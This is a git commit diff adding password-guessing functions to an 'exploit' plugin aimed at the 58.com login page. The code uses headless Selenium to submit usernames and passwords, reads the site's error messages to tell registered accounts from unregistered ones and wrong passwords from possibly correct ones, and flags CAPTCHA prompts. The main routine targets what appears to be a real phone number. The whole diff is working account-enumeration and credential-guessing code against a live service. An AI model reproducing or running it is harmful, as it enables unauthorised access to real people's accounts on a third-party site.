5f12f794c2ee5c5ed35ef89435bcb45bc6babdac
Hehouhua <1320901208@qq.com>
2019-04-02 10:50:56 +0800

    add password attempting for 58

--- exp/58.py
+++ exp/58.py
@@ -40,11 +40,14 @@ class exploit(plugin):
         #elem.send_keys(self.username+"uygifjvk")
         elem = driver.find_element_by_xpath('//*[@id="passwordUser"]')
         driver.execute_script("""document.getElementById("passwordUser").value="{0}";document.getElementById("passwordUser").focus()""".format(self.password))
+        #根据插件是否独立运行图片放在不同位置
         if __name__ == "__main__":
             driver.save_screenshot('58.png')
+        else:
+            driver.save_screenshot(self.log_dir+'/'+__name__+"/"+'58.png')
         elem = driver.find_element_by_xpath('//*[@id="btnSubmitUser"]')
         elem.click()
-        time.sleep(2)
+        time.sleep(self.timeout)
         result = driver.find_element_by_xpath('//*[@id="passwordTip"]')
         #<span id="passwordTip" class="wrong1 errorTip">该用户名不存在， <a class="gotoregUser" href="//passport.58.com/reg">立即注册?</a> </span>
         #<span id="passwordTip" class="wrong1 errorTip">该用户名与密码不符</span>
@@ -69,6 +72,58 @@ class exploit(plugin):
         
     def probe_nickname(self):
         return self.probe_all_in_one()
+    
+    def crack_all_in_one(self):
+        if len(self.password) < 6:
+            return False,"password should not be shorter than 6"
+        if len(self.password) > 16:
+            return False,"password should not be longer than 16"
+        from selenium import webdriver
+        from selenium.webdriver.chrome.options import Options
+        chrome_options = Options()
+        if  __name__ != "__main__":
+            chrome_options.add_argument("--headless")
+        driver = webdriver.Chrome(chrome_options=chrome_options)
+        url="""https://passport.58.com/login?"""
+        driver.get(url)
+        elem = driver.find_element_by_xpath('//*[@id="pwdLogin"]/i')
+        elem.click()
+        elem = driver.find_element_by_xpath('//*[@id="usernameUser"]')
+        elem.send_keys(self.username)
+        elem = driver.find_element_by_xpath('//*[@id="passwordUser"]')
+        driver.execute_script("""document.getElementById("passwordUser").value="{0}";document.getElementById("passwordUser").focus()""".format(self.password))
+        if __name__ == "__main__":
+            driver.save_screenshot('58.png')
+        elem = driver.find_element_by_xpath('//*[@id="btnSubmitUser"]')
+        elem.click()
+        time.sleep(self.timeout)
+        result = driver.find_element_by_xpath('//*[@id="passwordTip"]')
+        #<span id="passwordTip" class="wrong1 errorTip">该用户名不存在， <a class="gotoregUser" href="//passport.58.com/reg">立即注册?</a> </span>
+        #<span id="passwordTip" class="wrong1 errorTip">该用户名与密码不符</span>
+        errorTip = result.text
+        driver.close()
+        if u"不存在" in errorTip:
+            ret = False
+            msg = "not registered"
+        elif u"用户名与密码不符" in errorTip:
+            ret = True
+            msg = "password wrong"
+        elif u'' == errorTip:
+            ret = False
+            msg = "may need to enter CAPTCHA"
+        else:
+            ret = True
+            msg = "password may be correct"
+        return ret,msg
+        
+    def crack_phone(self):
+        return self.crack_all_in_one()
+        
+    def crack_email(self):
+        return self.crack_all_in_one()
+        
+    def crack_nickname(self):
+        return self.crack_all_in_one()
         
 def main():
     print exploit('./',('13603854765',)).probe()
